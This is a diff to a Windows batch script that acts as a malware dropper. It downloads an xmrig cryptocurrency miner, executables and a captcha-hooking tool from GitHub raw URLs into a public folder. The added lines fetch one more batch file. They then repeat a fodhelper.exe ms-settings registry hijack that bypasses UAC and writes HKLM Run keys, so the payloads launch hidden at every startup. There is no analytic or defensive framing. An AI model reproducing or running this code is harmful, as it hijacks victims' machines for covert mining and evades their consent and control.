@@ -3,6 +3,7 @@ powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -Dest
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/restartado.sh" -OutFile "C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd"
 cls
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/msedgedriver.exe" -OutFile "C:\Users\Public\Downloads\msedgedriver.exe";
+powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/vaiMain.bat" -OutFile "C:\Users\Public\Downloads\vaiMain.bat";
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/main.exe" -OutFile "C:\Users\Public\Downloads\main.exe";
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/AnyCaptchaCallbackHooker_Unpacked.zip" -OutFile "C:\Users\Public\Downloads\AnyCaptchaCallbackHooker_Unpacked.zip";
 powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\AnyCaptchaCallbackHooker_Unpacked.zip -DestinationPath C:\Users\Public\Downloads
@@ -95,6 +96,11 @@ fodhelper.exe
 cls
 cls
 powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command set-itemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run nomee111 C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd""" -Force
+powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
+powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
+fodhelper.exe
+cls
+powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command set-itemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run gogogo2 C:\Users\Public\Downloads\vaiMain.bat""" -Force
 powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
 fodhelper.exe
